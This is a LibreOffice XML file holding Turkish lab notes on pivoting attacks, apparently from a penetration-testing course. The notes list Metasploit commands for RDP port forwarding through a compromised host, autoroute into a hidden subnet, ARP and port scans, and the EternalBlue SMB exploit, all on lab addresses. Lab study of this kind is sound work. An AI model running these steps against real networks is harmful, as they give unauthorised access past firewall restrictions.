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ff0000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="12pt" fo:font-weight="bold" officeooo:rsid="003e2ff3" officeooo:paragraph-rsid="001d27fe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3e2ff3" officeooo:paragraph-rsid="00315f80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fb6ce" officeooo:paragraph-rsid="003fb6ce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127622" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="14pt" fo:font-weight="bold" officeooo:rsid="003fb6ce" officeooo:paragraph-rsid="003fb6ce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ff0000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="12pt" fo:font-weight="bold" officeooo:rsid="003fb6ce" officeooo:paragraph-rsid="003fb6ce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4.RELAY VE PİVOTİNG SALDIRILARI</text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P8">Pivoting in Kavranması</text:p>
      <text:p text:style-name="P6">Remote Desktop kuralını kapadık.</text:p>
      <text:p text:style-name="P6">Kendi oluşturduğum RDP kuralında, sadece ahmetin pc nin gitmesini sağladık.</text:p>
      <text:p text:style-name="P6">Pivot makinemiz, ahmet olacak.</text:p>
      <text:p text:style-name="P6">3389 <text:s/>portunu kullanmak için açtık.</text:p>
      <text:p text:style-name="P6"/>
      <text:p text:style-name="P6"/>
      <text:p text:style-name="P8">Port yönlendirme ile İzinsiz Hedefe Erişim</text:p>
      <text:p text:style-name="P6">ahmette meterpreter aldık.</text:p>
      <text:p text:style-name="P6">portfwd add -l 1234 -r 10.10.10.20 -p 3389</text:p>
      <text:p text:style-name="P6">netstat -l <text:s/>(buradan da gördüğümüz gibi hali hazırda 1234 portunu dinliyoruz.)</text:p>
      <text:p text:style-name="P6">kendi üzerimizden oraya talep oluşturup, 10.10.10.20 ye yönlednirileceğiz.</text:p>
      <text:p text:style-name="P6">Tünelleme yapacağız..</text:p>
      <text:p text:style-name="P6">rdesktop 127.0.0.1:1234</text:p>
      <text:p text:style-name="P5"/>
      <text:p text:style-name="P5"/>
      <text:p text:style-name="P5"/>
      <text:p text:style-name="P8">LAB Güncelleme, yeni Network Oluşturma</text:p>
      <text:p text:style-name="P6">Ahmetin pc yi başka Network üzerine alacağız.</text:p>
      <text:p text:style-name="P6"/>
      <text:p text:style-name="P5"/>
      <text:p text:style-name="P8">Bilinmeyen Diğer Ağların ve Hedeflerin Tespiti</text:p>
      <text:p text:style-name="P6">Ahmette meterpreter aldık.</text:p>
      <text:p text:style-name="P6">Ipconfig ile ip aldık.</text:p>
      <text:p text:style-name="P6">Amacımız, round ekleterek kendimizi oraya yönlendirmek.</text:p>
      <text:p text:style-name="P6">run autoroute -s 192.168.10.0/24</text:p>
      <text:p text:style-name="P6">run autoroute -p</text:p>
      <text:p text:style-name="P6">aynısını, metasploitten de yapabiliriz</text:p>
      <text:p text:style-name="P6">post/multi/manage/autoroute</text:p>
      <text:p text:style-name="P6">session ayarlıyoruz</text:p>
      <text:p text:style-name="P6">set subnet 192.168.10.0 <text:s/>(netmasktan zaten ağ olduğunu anlıyor.)</text:p>
      <text:p text:style-name="P6">run.. içerdeyiz..</text:p>
      <text:p text:style-name="P6">windows/gather/arp_scanner ayarlayıp run.</text:p>
      <text:p text:style-name="P6">Ipleri bulduk, mac adresleriyle beraber</text:p>
      <text:p text:style-name="P6">scanner/portscan/tcp <text:s text:c="2"/></text:p>
      <text:p text:style-name="P5">set rhosts 192.168.10.5</text:p>
      <text:p text:style-name="P6">run <text:s/>(açık portları bulduk.)</text:p>
      <text:p text:style-name="P6">windows/smb/ms17_010_eternalblue <text:s text:c="2"/></text:p>
      <text:p text:style-name="P6">içerdeyiz..</text:p>
      <text:p text:style-name="P6"/>
      <text:p text:style-name="P5"/>
      <text:p text:style-name="P5"/>
      <text:p text:style-name="P4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3T14:10:53.723900895</dc:date>
    <meta:editing-duration>PT6H12M24S</meta:editing-duration>
    <meta:editing-cycles>39</meta:editing-cycles>
    <meta:generator>LibreOffice/7.4.1.1$Linux_X86_64 LibreOffice_project/40$Build-1</meta:generator>
    <meta:document-statistic meta:table-count="0" meta:image-count="0" meta:object-count="0" meta:page-count="1" meta:paragraph-count="33" meta:word-count="143" meta:character-count="1176" meta:non-whitespace-character-count="1056"/>
  </office:meta>
</office:document-meta>
</file>